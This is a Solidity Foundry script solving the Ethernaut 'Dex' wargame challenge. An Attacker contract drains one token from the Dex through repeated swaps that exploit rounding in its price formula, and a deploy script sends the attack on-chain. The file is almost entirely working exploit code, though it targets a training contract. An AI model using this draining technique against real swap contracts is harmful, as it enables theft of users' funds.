// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Dex} from "../src/Dex.sol";
import {IERC20} from "openzeppelin-contracts-08/contracts/token/ERC20/IERC20.sol";

contract Attacker {

    address token1;
    address token2;
    Dex dex;

    constructor(address _token1, address _token2, address _dex) {
        token1 = _token1;
        token2 = _token2;
        dex = Dex(_dex);
    }

    function hack() external {
        IERC20(token1).transferFrom(msg.sender, address(this), 10);
        IERC20(token2).transferFrom(msg.sender, address(this), 10);

        IERC20(token1).approve(address(dex), type(uint256).max);
        IERC20(token2).approve(address(dex), type(uint256).max);

        // ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
        // 10 * 100 / 100 = 10
        dex.swap(token1, token2, 10);
        // ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
        // 20 * 110 / 90 = 24,4 = 24
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);
        require(IERC20(token1).balanceOf(address(dex)) == 0, "challange failed");
    }
}

/// @author agadzhalov
/// @title Solution to Dex Ethernaut challenge
contract DexScript is Script {

    Dex dex = Dex(0x25e668D7FCc8F178F522a8d039f4bF3694419e0A);
        
    address token1 = dex.token1();
    address token2 = dex.token2();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy Attacker contract with references to both tokens and the Dex contract
        Attacker attacker = new Attacker(token1, token2, address(dex));

        // Approve the Attacker contract to use max token balances on behalf of the user
        IERC20(token1).approve(address(attacker), type(uint256).max);
        IERC20(token2).approve(address(attacker), type(uint256).max);

        // Execute the hack
        attacker.hack();
        console.log("token1 dex balance", IERC20(token1).balanceOf(address(dex)));
        vm.stopBroadcast();
    }

}